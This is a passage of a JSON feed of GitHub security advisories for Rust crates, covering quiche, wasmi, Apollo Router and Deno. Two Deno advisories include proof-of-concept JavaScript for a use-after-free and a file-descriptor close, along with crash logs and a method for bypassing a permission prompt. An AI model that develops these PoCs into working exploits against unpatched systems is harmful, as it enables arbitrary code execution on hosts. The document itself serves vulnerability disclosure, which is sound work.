{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Rust crates",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/rust.json",
    "description": "Security Advisory for Rust crates on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Cloudflare Quiche (through version 0.19.1/0.20.0) was affected by an unlimited resource allocation vulnerability causing rapid increase of memory usage of the system running quiche server or client.</p>\n<p>A remote attacker could take advantage of this vulnerability by repeatedly sending an unlimited number of 1-RTT CRYPTO frames after previously completing the QUIC handshake.\nExploitation was possible for the duration of the connection which could be extended by the attacker.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Quiche 0.19.2 and 0.20.1 are the earliest versions containing the fix for this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cloudflare/quiche/security/advisories/GHSA-78wx-jg4j-5j6g\">https://github.com/cloudflare/quiche/security/advisories/GHSA-78wx-jg4j-5j6g</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1765\">https://nvd.nist.gov/vuln/detail/CVE-2024-1765</a></li>\n<li><a href=\"https://github.com/cloudflare/quiche/commit/1017466c143fc93a82b286a1ba35e53334cdf8e2\">https://github.com/cloudflare/quiche/commit/1017466c143fc93a82b286a1ba35e53334cdf8e2</a></li>\n<li><a href=\"https://github.com/cloudflare/quiche/commit/11dbf5461ab657bbc02e466d719070124b27ef3c\">https://github.com/cloudflare/quiche/commit/11dbf5461ab657bbc02e466d719070124b27ef3c</a></li>\n<li><a href=\"https://github.com/cloudflare/quiche/releases/tag/0.19.2\">https://github.com/cloudflare/quiche/releases/tag/0.19.2</a></li>\n<li><a href=\"https://github.com/cloudflare/quiche/releases/tag/0.20.1\">https://github.com/cloudflare/quiche/releases/tag/0.20.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-78wx-jg4j-5j6g\">https://github.com/advisories/GHSA-78wx-jg4j-5j6g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-78wx-jg4j-5j6g",
            "title": "[quiche] quiche vulnerable to unlimited resource allocation by QUIC CRYPTO frames flooding",
            "date_modified": "2024-03-13T15:39:42.000Z",
            "date_published": "2024-03-13T15:39:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-78wx-jg4j-5j6g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Cloudflare Quiche (through version 0.19.1/0.20.0) was affected by an unlimited resource allocation vulnerability causing rapid increase of memory usage of the system running quiche server or client.</p>\n<p>A remote attacker could take advantage of this vulnerability by repeatedly sending an unlimited number of 1-RTT CRYPTO frames after previously completing the QUIC handshake.\nExploitation was possible for the duration of the connection which could be extended by the attacker.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Quiche 0.19.2 and 0.20.1 are the earliest versions containing the fix for this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cloudflare/quiche/security/advisories/GHSA-78wx-jg4j-5j6g\">https://github.com/cloudflare/quiche/security/advisories/GHSA-78wx-jg4j-5j6g</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1765\">https://nvd.nist.gov/vuln/detail/CVE-2024-1765</a></li>\n<li><a href=\"https://github.com/cloudflare/quiche/commit/1017466c143fc93a82b286a1ba35e53334cdf8e2\">https://github.com/cloudflare/quiche/commit/1017466c143fc93a82b286a1ba35e53334cdf8e2</a></li>\n<li><a href=\"https://github.com/cloudflare/quiche/commit/11dbf5461ab657bbc02e466d719070124b27ef3c\">https://github.com/cloudflare/quiche/commit/11dbf5461ab657bbc02e466d719070124b27ef3c</a></li>\n<li><a href=\"https://github.com/cloudflare/quiche/releases/tag/0.19.2\">https://github.com/cloudflare/quiche/releases/tag/0.19.2</a></li>\n<li><a href=\"https://github.com/cloudflare/quiche/releases/tag/0.20.1\">https://github.com/cloudflare/quiche/releases/tag/0.20.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-78wx-jg4j-5j6g\">https://github.com/advisories/GHSA-78wx-jg4j-5j6g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-78wx-jg4j-5j6g",
            "title": "[quiche] quiche vulnerable to unlimited resource allocation by QUIC CRYPTO frames flooding",
            "date_modified": "2024-03-13T15:39:42.000Z",
            "date_published": "2024-03-13T15:39:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-78wx-jg4j-5j6g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Cloudflare quiche was discovered to be vulnerable to unbounded storage of information related to connection ID retirement, which could lead to excessive resource consumption. Each QUIC connection possesses a set of connection Identifiers (IDs); see <a href=\"https://datatracker.ietf.org/doc/html/rfc9000#section-5.1\">RFC 9000 Section 5.1</a>. Endpoints declare the number of active connection IDs they are willing to support using the active_connection_id_limit transport parameter. The peer can create new IDs using a NEW_CONNECTION_ID frame but must stay within the active ID limit. This is done by retirement of old IDs, the endpoint sends NEW_CONNECTION_ID includes a value in the retire_prior_to field, which elicits a RETIRE_CONNECTION_ID frame as confirmation. An unauthenticated remote attacker can exploit the vulnerability by sending NEW_CONNECTION_ID frames and manipulating the connection (e.g. by restricting the peer's congestion window size) so that RETIRE_CONNECTION_ID frames can only be sent at a slower rate than they are received, leading to storage of information related to connection IDs in an unbounded queue. </p>\n<h3 id=\"patches\">Patches</h3>\n<p>Quiche versions 0.19.2 and 0.20.1 are the earliest to address this problem. There is no workaround for affected versions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cloudflare/quiche/security/advisories/GHSA-xhg9-xwch-vr7x\">https://github.com/cloudflare/quiche/security/advisories/GHSA-xhg9-xwch-vr7x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1410\">https://nvd.nist.gov/vuln/detail/CVE-2024-1410</a></li>\n<li><a href=\"https://github.com/cloudflare/quiche/commit/0c5733a84c41e9e178adc866b11ce59ac264f5af\">https://github.com/cloudflare/quiche/commit/0c5733a84c41e9e178adc866b11ce59ac264f5af</a></li>\n<li><a href=\"https://github.com/cloudflare/quiche/commit/5be8143126f8cfa8a483d4a5ae475b9a46053fa1\">https://github.com/cloudflare/quiche/commit/5be8143126f8cfa8a483d4a5ae475b9a46053fa1</a></li>\n<li><a href=\"https://github.com/cloudflare/quiche/commit/7ab42af5f5e97f20f1d63b7ea2f9ab0536678c40\">https://github.com/cloudflare/quiche/commit/7ab42af5f5e97f20f1d63b7ea2f9ab0536678c40</a></li>\n<li><a href=\"https://github.com/cloudflare/quiche/commit/a983998c4408605905ee9a6ab0fc00e68436ac67\">https://github.com/cloudflare/quiche/commit/a983998c4408605905ee9a6ab0fc00e68436ac67</a></li>\n<li><a href=\"https://github.com/cloudflare/quiche/releases/tag/0.19.2\">https://github.com/cloudflare/quiche/releases/tag/0.19.2</a></li>\n<li><a href=\"https://github.com/cloudflare/quiche/releases/tag/0.20.1\">https://github.com/cloudflare/quiche/releases/tag/0.20.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xhg9-xwch-vr7x\">https://github.com/advisories/GHSA-xhg9-xwch-vr7x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xhg9-xwch-vr7x",
            "title": "[quiche] quiche vulnerable to unbounded storage of information related to connection ID retirement",
            "date_modified": "2024-03-13T15:38:22.000Z",
            "date_published": "2024-03-13T15:38:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xhg9-xwch-vr7x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Cloudflare quiche was discovered to be vulnerable to unbounded storage of information related to connection ID retirement, which could lead to excessive resource consumption. Each QUIC connection possesses a set of connection Identifiers (IDs); see <a href=\"https://datatracker.ietf.org/doc/html/rfc9000#section-5.1\">RFC 9000 Section 5.1</a>. Endpoints declare the number of active connection IDs they are willing to support using the active_connection_id_limit transport parameter. The peer can create new IDs using a NEW_CONNECTION_ID frame but must stay within the active ID limit. This is done by retirement of old IDs, the endpoint sends NEW_CONNECTION_ID includes a value in the retire_prior_to field, which elicits a RETIRE_CONNECTION_ID frame as confirmation. An unauthenticated remote attacker can exploit the vulnerability by sending NEW_CONNECTION_ID frames and manipulating the connection (e.g. by restricting the peer's congestion window size) so that RETIRE_CONNECTION_ID frames can only be sent at a slower rate than they are received, leading to storage of information related to connection IDs in an unbounded queue. </p>\n<h3 id=\"patches\">Patches</h3>\n<p>Quiche versions 0.19.2 and 0.20.1 are the earliest to address this problem. There is no workaround for affected versions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cloudflare/quiche/security/advisories/GHSA-xhg9-xwch-vr7x\">https://github.com/cloudflare/quiche/security/advisories/GHSA-xhg9-xwch-vr7x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1410\">https://nvd.nist.gov/vuln/detail/CVE-2024-1410</a></li>\n<li><a href=\"https://github.com/cloudflare/quiche/commit/0c5733a84c41e9e178adc866b11ce59ac264f5af\">https://github.com/cloudflare/quiche/commit/0c5733a84c41e9e178adc866b11ce59ac264f5af</a></li>\n<li><a href=\"https://github.com/cloudflare/quiche/commit/5be8143126f8cfa8a483d4a5ae475b9a46053fa1\">https://github.com/cloudflare/quiche/commit/5be8143126f8cfa8a483d4a5ae475b9a46053fa1</a></li>\n<li><a href=\"https://github.com/cloudflare/quiche/commit/7ab42af5f5e97f20f1d63b7ea2f9ab0536678c40\">https://github.com/cloudflare/quiche/commit/7ab42af5f5e97f20f1d63b7ea2f9ab0536678c40</a></li>\n<li><a href=\"https://github.com/cloudflare/quiche/commit/a983998c4408605905ee9a6ab0fc00e68436ac67\">https://github.com/cloudflare/quiche/commit/a983998c4408605905ee9a6ab0fc00e68436ac67</a></li>\n<li><a href=\"https://github.com/cloudflare/quiche/releases/tag/0.19.2\">https://github.com/cloudflare/quiche/releases/tag/0.19.2</a></li>\n<li><a href=\"https://github.com/cloudflare/quiche/releases/tag/0.20.1\">https://github.com/cloudflare/quiche/releases/tag/0.20.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xhg9-xwch-vr7x\">https://github.com/advisories/GHSA-xhg9-xwch-vr7x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xhg9-xwch-vr7x",
            "title": "[quiche] quiche vulnerable to unbounded storage of information related to connection ID retirement",
            "date_modified": "2024-03-13T15:38:22.000Z",
            "date_published": "2024-03-13T15:38:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xhg9-xwch-vr7x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>In the WASMI Interpreter, an <a href=\"https://cwe.mitre.org/data/definitions/787.html\">Out-of-bounds Buffer Write</a> will arise arise if the host calls or resumes a Wasm function with more parameters than the default limit (128), as it will surpass the stack value. This doesn’t affect calls from Wasm to Wasm, only from host to Wasm.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>After conducting an analysis of the dependent Polkadot systems of <code>wasmi</code>: <a href=\"https://github.com/paritytech/polkadot-sdk/tree/master/substrate/frame/contracts\">Pallet Contracts</a>, <a href=\"https://github.com/paritytech/parity-signer\">Parity Signer</a>, and <a href=\"https://github.com/smol-dot/smoldot\">Smoldot</a>, we have found that none on those systems have been affected by the issue as they are calling host to Wasm function with a small limited amount of parameters always. </p>\n<h3 id=\"mitigations\">Mitigations</h3>\n<p>If you are using <code>wasmi</code> betwen version 0.15.0 and 0.31.0, please update it to the <a href=\"https://github.com/paritytech/wasmi/releases/tag/v0.31.1\">0.31.1</a> patch release that we just published.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Ensure no more than 128 parameters can be pass in a call from the host to a Wasm function. </p>\n<h3 id=\"references\">References</h3>\n<p>Patch PR: </p>\n<h3 id=\"special-thanks\">Special thanks</h3>\n<p>Special thanks to Stellar Development Foundation for reporting this security vulnerability.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/wasmi-labs/wasmi/security/advisories/GHSA-75jp-vq8x-h4cq\">https://github.com/wasmi-labs/wasmi/security/advisories/GHSA-75jp-vq8x-h4cq</a></li>\n<li><a href=\"https://github.com/wasmi-labs/wasmi/commit/f7b3200e9f3dc9e2cbca966cb255c228453c792f\">https://github.com/wasmi-labs/wasmi/commit/f7b3200e9f3dc9e2cbca966cb255c228453c792f</a></li>\n<li><a href=\"https://github.com/wasmi-labs/wasmi/releases/tag/v0.31.1\">https://github.com/wasmi-labs/wasmi/releases/tag/v0.31.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-75jp-vq8x-h4cq\">https://github.com/advisories/GHSA-75jp-vq8x-h4cq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-75jp-vq8x-h4cq",
            "title": "[wasmi] Wasmi Out-of-bounds Write for host to Wasm calls with more than 128 Parameters",
            "date_modified": "2024-03-07T17:26:28.000Z",
            "date_published": "2024-03-07T17:26:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-75jp-vq8x-h4cq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Apollo Router is a configurable, high-performance graph router written in Rust to run a federated supergraph that uses Apollo Federation. Affected versions are subject to a Denial-of-Service (DoS) type vulnerability. When receiving compressed HTTP payloads, affected versions of the Router evaluate the <code>limits.http_max_request_bytes</code> configuration option after the entirety of the compressed payload is decompressed. If affected versions of the Router receive highly compressed payloads, this could result in significant memory consumption while the compressed payload is expanded. </p>\n<h3 id=\"patches\">Patches</h3>\n<p>Router version 1.40.2 has a fix for the vulnerability.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you are unable to upgrade, you may be able to implement mitigations at proxies or load balancers positioned in front of your Router fleet (e.g. Nginx, HAProxy, or cloud-native WAF services) by creating limits on HTTP body upload size. </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/apollographql/router/security/advisories/GHSA-cgqf-3cq5-wvcj\">https://github.com/apollographql/router/security/advisories/GHSA-cgqf-3cq5-wvcj</a></li>\n<li><a href=\"https://github.com/apollographql/router/commit/9e9527c73c8f34fc8438b09066163cd42520f413\">https://github.com/apollographql/router/commit/9e9527c73c8f34fc8438b09066163cd42520f413</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cgqf-3cq5-wvcj\">https://github.com/advisories/GHSA-cgqf-3cq5-wvcj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cgqf-3cq5-wvcj",
            "title": "[apollo-router] Apollo Router's Compressed Payloads do not respect HTTP Payload Limits",
            "date_modified": "2024-03-06T18:24:18.000Z",
            "date_published": "2024-03-06T18:24:17.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cgqf-3cq5-wvcj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Use of inherently unsafe <code>*const c_void</code> and <code>ExternalPointer</code> leads to use-after-free access of the underlying structure, resulting in arbitrary code execution.</p>\n<h3 id=\"details\">Details</h3>\n<p><code>*const c_void</code> and <code>ExternalPointer</code> (defined via <code>external!()</code> macros) types are used to represent <code>v8::External</code> wrapping arbitrary <code>void*</code> with an external lifetime. This is inherently unsafe as we are effectively eliding all Rust lifetime safety guarantees.</p>\n<p><code>*const c_void</code> is trivially unsafe. <code>ExternalPointer</code> attempts to resolve this issue by wrapping the underlying pointer with a <code>usize</code>d marker (<a href=\"https://github.com/denoland/deno_core/blob/a2838062a8f51926140a48a8aa926330c6f9070c/core/external.rs#L49\"><code>ExternalWithMarker&lt;T&gt;</code></a>).</p>\n<p>However, the marker <a href=\"https://github.com/denoland/deno_core/blob/a2838062a8f51926140a48a8aa926330c6f9070c/core/external.rs#L10\">relies on the randomness of PIE address (binary base address)</a> which is still trivially exploitable for a non-PIE binary. It is also equally exploitable on a PIE binary when an attacker is able to derandomize the PIE address. This is problematic as it escalates an information leak of the PIE address into an exploitable vulnerability.</p>\n<p>Note that an attacker able to control code executed inside the Deno runtime is very likely to be able to bypass ASLR with any means necessary (e.g. by chaining another vulnerability, or by using other granted permissions such as <code>--allow-read</code> to read <code>/proc/self/maps</code>).</p>\n<h3 id=\"poc\">PoC</h3>\n<p>For simplicity, we use Deno version 1.38.0 where streaming operations uses <code>*const c_void</code>. Testing environment is Docker image <code>denoland/deno:alpine-1.38.0@sha256:fe51a00f4fbbaf1e72b29667c3eeeda429160cef2342f22a92c3820020d41f38</code> although the exact versions shouldn't matter much if it's in 1.36.2 up to 1.38.0 (before <code>ExternalPointer</code> patch, refer Impact section for details)</p>\n<pre><code class=\"language-js\">const ops = Deno[Deno.internal].core.ops;\nconst rid = ops.op_readable_stream_resource_allocate();\nconst sink = ops.op_readable_stream_resource_get_sink(rid);\n\n// close\nops.op_readable_stream_resource_close(sink);\nops.op_readable_stream_resource_close(sink);\n\n// reclaim BoundedBufferChannelInner\nconst ab = new ArrayBuffer(0x8058);\nconst dv = new DataView(ab);\n\n// forge chunk contents\ndv.setBigUint64(0, 2n, true);\ndv.setBigUint64(0x8030, 0x1337c0d30000n, true);\n\n// trigger segfault\nDeno.close(rid);\n</code></pre>\n<p>Below is the dmesg log after the crash. We see that Deno has segfaulted on <code>1337c0d30008</code>, which is +8 of what we have written at offset 0x8030. Note also that the dereferenced value will immediately be used as a function pointer, with the first argument dereferenced from offset 0x8038 - it is trivial to use this to build an end-to-end exploit.</p>\n<pre><code class=\"language-text\">[ 6439.821046] deno[15088]: segfault at 1337c0d30008 ip 0000557b53e2fb3e sp 00007fffd485ac70 error 4 in deno[557b51714000+2d7f000] likely on CPU 12 (core 12, socket 0)\n[ 6439.821054] Code: 00 00 00 00 48 85 c0 74 03 ff 50 08 49 8b 86 30 80 00 00 49 8b be 38 80 00 00 49 c7 86 30 80 00 00 00 00 00 00 48 85 c0 74 03 &lt;ff&gt; 50 08 48 ff 03 48 83 c4 08 5b 41 5e c3 48 8d 3d 0d 1a 59 fb 48\n</code></pre>\n<p>The same vulnerability exists for <code>ExternalPointer</code> implementation, but now it is required for the attacker to either leak the PIE address somehow, or else exploit unexpected aliasing behavior of <code>v8::External</code> values. The latter has not been investigated in depth, but it is theoretically possible to alias the same underlying pointer to different <code>v8::External</code> on different threads (Workers) and exploit the concurrency (<code>RefCell</code> may break this though).</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Use of inherently unsafe <code>*const c_void</code> and <code>ExternalPointer</code> leads to use-after-free access of the underlying structure, which is exploitable by an attacker controlling the code executed inside a Deno runtime to obtain arbitrary code execution on the host machine regardless of permissions.</p>\n<p>This bug is <strong>known to be exploitable</strong> for both <code>*const c_void</code> and <code>ExternalPointer</code> implementations.</p>\n<p>Affected versions of Deno is from 1.36.2 up to latest.</p>\n<ul>\n<li><a href=\"https://github.com/denoland/deno/blob/main/ext/web/stream_resource.rs\">ext/web/stream_resource.rs</a>:<ul>\n<li><code>*const c_void</code> introduced in 1.36.2</li>\n<li>Patched into <code>ExternalPointer</code> in 1.38.1</li>\n</ul>\n</li>\n<li><a href=\"https://github.com/denoland/deno/blob/main/ext/http/http_next.rs\">ext/http/http_next.rs</a>:<ul>\n<li><code>ExternalPointer</code> introduced in 1.38.2</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/denoland/deno/security/advisories/GHSA-3j27-563v-28wf\">https://github.com/denoland/deno/security/advisories/GHSA-3j27-563v-28wf</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3j27-563v-28wf\">https://github.com/advisories/GHSA-3j27-563v-28wf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3j27-563v-28wf",
            "title": "[Deno] *const c_void / ExternalPointer unsoundness leading to use-after-free",
            "date_modified": "2024-03-06T17:04:30.000Z",
            "date_published": "2024-03-06T17:04:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3j27-563v-28wf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Use of raw file descriptors in <code>op_node_ipc_pipe()</code> leads to premature close of arbitrary file descriptors, allowing standard input to be re-opened as a different resource resulting in permission prompt bypass.</p>\n<h3 id=\"details\">Details</h3>\n<p>Node child_process IPC relies on the JS side to pass the raw IPC file descriptor to <code>op_node_ipc_pipe()</code>, which returns a <code>IpcJsonStreamResource</code> ID associated with the file descriptor. On closing the resource, the raw file descriptor is closed together.</p>\n<p>Although closing a file descriptor is seemingly a harmless task, this has been known to be exploitable:</p>\n<ul>\n<li>With <code>--allow-read</code> and <code>--allow-write</code> permissions, one can open <code>/dev/ptmx</code> as stdin. This device happily accepts TTY ioctls and pipes anything written into it back to the reader. <ul>\n<li>This has been presented in a hacking competition (WACON 2023 Quals \"dino jail\").</li>\n<li>However, the precondition of this challenge was heavily contrived: fd 0 has manually been closed by FFI and <code>setuid()</code> was used to drop permissions and deny access to <code>/proc</code> since global write permissions are usually equivalent to arbitrary code execution (<code>/proc/self/mem</code>).</li>\n</ul>\n</li>\n</ul>\n<p>As this vulnerability conveniently allows us to close stdin (fd 0) without any FFI, we can open any resource that when read returns <code>y</code>, <code>Y</code> or <code>A</code> as its first character (<a href=\"https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L265\">runtimes/permissions/prompter.rs</a>) to bypass the prompt.</p>\n<p>There is a caveat however - all stdio/stdin/stderr streams are <a href=\"https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L214\">locked</a>, after which <a href=\"https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L220\"><code>clear_stdin()</code></a> is called. This invokes <a href=\"https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L99\"><code>libc::tcflush(0, libc::TCIFLUSH)</code></a> which fails on a non-TTY file descriptor.</p>\n<p>This can be exploited by widening the race window between <code>clear_stdin()</code> and the next <a href=\"https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L256\"><code>stdin_lock.read_line()</code></a>. Notably, the prompt message contains the requested resource name (path) which is filtered by <a href=\"https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L225\"><code>strip_ansi_codes_and_ascii_control()</code></a>. This is also concatenated by <a href=\"https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L241\"><code>write!()</code></a> to make a single buffer printed out to stderr. Thus, if we request a very long resource name, the window will widen allowing us to easily and stably race another Worker that closes fd 0 and opens a resource starting with an <code>A\\n</code> within the race window.</p>\n<p>Note that attacker does not need any permissions to exploit this bug to a full permission prompt bypass, as Cache API can be used to create and open files with controlled content without any permissions. Refer to the Impact section for more details.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Testing environment is Docker image <code>denoland/deno:alpine-1.39.0@sha256:95064390f2c115673762bfc4fe15b1a7f81c859038b8c02b277ede7cd8a2ccbf</code>.</p>\n<p>Below PoC closes stdout (fd 1) and then prints two lines, one on stdout and one on stderr. Only the latter line is shown as stdout file descriptor is closed.</p>\n<pre><code class=\"language-js\">const ops = Deno[Deno.internal].core.ops;\n\n// open fd 1 as ipc stream resource\nconst rid = ops.op_node_ipc_pipe(1);\n\n// close resource &amp; fd 1\nDeno.close(rid);\n\n// this should not be seen (stdout)\nconsole.log('not seen');\n\n// but this is seen (stderr)\nconsole.error('seen');\n</code></pre>\n<p>Below is <code>/proc/$(pgrep deno)/fd</code> right after executing the last line of the above PoC. We see that fd 1 is indeed missing.</p>\n<pre><code class=\"language-text\">total 0\ndr-x------ 2 root root 30 Dec 18 07:07 ./\ndr-xr-xr-x 9 root root  0 Dec 18 07:07 ../\nlrwx------ 1 root root 64 Dec 18 07:07 0 -&gt; /dev/pts/0\nl-wx------ 1 root root 64 Dec 18 07:07 10 -&gt; 'pipe:[159305]'\nlr-x------ 1 root root 64 Dec 18 07:07 11 -&gt; 'pipe:[159306]'\nl-wx------ 1 root root 64 Dec 18 07:07 12 -&gt; 'pipe:[159306]'\nlrwx------ 1 root root 64 Dec 18 07:07 13 -&gt; /deno-dir/dep_analysis_cache_v1\nl-wx------ 1 root root 64 Dec 18 07:07 14 -&gt; 'pipe:[159305]'\nl-wx------ 1 root root 64 Dec 18 07:07 15 -&gt; 'pipe:[159306]'\nlrwx------ 1 root root 64 Dec 18 07:07 16 -&gt; /deno-dir/node_analysis_cache_v1\nlrwx------ 1 root root 64 Dec 18 07:07 17 -&gt; /dev/pts/0\nlrwx------ 1 root root 64 Dec 18 07:07 18 -&gt; /dev/pts/0\nlrwx------ 1 root root 64 Dec 18 07:07 19 -&gt; /dev/pts/0\nlrwx------ 1 root root 64 Dec 18 07:07 2 -&gt; /dev/pts/0\nlrwx------ 1 root root 64 Dec 18 07:07 20 -&gt; 'anon_inode:[eventpoll]'\nlrwx------ 1 root root 64 Dec 18 07:07 21 -&gt; 'anon_inode:[eventfd]'\nlrwx------ 1 root root 64 Dec 18 07:07 22 -&gt; 'anon_inode:[eventpoll]'\nlrwx------ 1 root root 64 Dec 18 07:07 23 -&gt; 'socket:[159302]'\nlrwx------ 1 root root 64 Dec 18 07:07 24 -&gt; 'anon_inode:[eventpoll]'\nlrwx------ 1 root root 64 Dec 18 07:07 25 -&gt; 'anon_inode:[eventfd]'\nlrwx------ 1 root root 64 Dec 18 07:07 26 -&gt; 'anon_inode:[eventpoll]'\nlrwx------ 1 root root 64 Dec 18 07:07 27 -&gt; 'socket:[159302]'\nlrwx------ 1 root root 64 Dec 18 07:07 28 -&gt; 'socket:[159310]'\nlrwx------ 1 root root 64 Dec 18 07:07 29 -&gt; 'socket:[159308]'\nlrwx------ 1 root root 64 Dec 18 07:07 3 -&gt; 'anon_inode:[eventpoll]'\nlrwx------ 1 root root 64 Dec 18 07:07 30 -&gt; 'socket:[159309]'\nlrwx------ 1 root root 64 Dec 18 07:07 4 -&gt; 'anon_inode:[eventfd]'\nlrwx------ 1 root root 64 Dec 18 07:07 5 -&gt; 'anon_inode:[eventpoll]'\nlrwx------ 1 root root 64 Dec 18 07:07 6 -&gt; 'socket:[159302]'\nlrwx------ 1 root root 64 Dec 18 07:07 7 -&gt; 'socket:[159303]'\nlrwx------ 1 root root 64 Dec 18 07:07 8 -&gt; 'socket:[159302]'\nlr-x------ 1 root root 64 Dec 18 07:07 9 -&gt; 'pipe:[159305]'\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Use of raw file descriptors in <code>op_node_ipc_pipe()</code> leads to premature close of arbitrary file descriptors. This allow standard input (fd 0) to be closed and re-opened for a different resource, which allows a silent permission prompt bypass. This is exploitable by an attacker controlling the code executed inside a Deno runtime to obtain arbitrary code execution on the host machine regardless of permissions.</p>\n<p>This bug is <strong>known to be exploitable</strong> - there is a working exploit that achieves arbitrary code execution by bypassing prompts from zero permissions, additionally abusing the fact that Cache API lacks filesystem permission checks. The attack can be conducted silently as stderr can also be closed, suppressing all prompt outputs.</p>\n<blockquote>\n<p>Note that Deno's security model is currently described as follows:</p>\n<ul>\n<li>All runtime I/O is considered to be privileged and must always be guarded by a runtime permission. This includes filesystem access, network access, etc.<ul>\n<li>The only exception to this is runtime storage explosion attacks that are isolated to a part of the file system, caused by evaluated code (for example, caching big dependencies or no limits on runtime caches such as the Web Cache API).</li>\n</ul>\n</li>\n</ul>\n<p>Although it is ambiguous if the fundamental lack of file system permission checks on Web Cache API is a vulnerability or not, the reporter have not reported this as a vulnerability assuming that this is a known risk (or a feature).</p>\n</blockquote>\n<p>Affected version of Deno is 1.39.0.</p>\n<ul>\n<li>Introduced with commit 5a91a06</li>\n<li>Fixed with commit 55fac9f</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/denoland/deno/security/advisories/GHSA-6q4w-9x56-rmwq\">https://github.com/denoland/deno/security/advisories/GHSA-6q4w-9x56-rmwq</a></li>\n<li><a href=\"https://github.com/denoland/deno/commit/55fac9f5ead6d30996400e8597c969b675c5a22b\">https://github.com/denoland/deno/commit/55fac9f5ead6d30996400e8597c969b675c5a22b</a></li>\n<li><a href=\"https://github.com/denoland/deno/commit/5a91a065b882215dde209baf626247e54c21a392\">https://github.com/denoland/deno/commit/5a91a065b882215dde209baf626247e54c21a392</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6q4w-9x56-rmwq\">https://github.com/advisories/GHSA-6q4w-9x56-rmwq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6q4w-9x56-rmwq",
            "title": "[deno] Deno arbitrary file descriptor close via `op_node_ipc_pipe()` leading to permission prompt bypass",
            "date_modified": "2024-03-06T17:04:08.000Z",
            "date_published": "2024-03-06T17:04:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6q4w-9x56-rmwq"
            },
            "tags": [
                "severity"
            ]
        },
        {
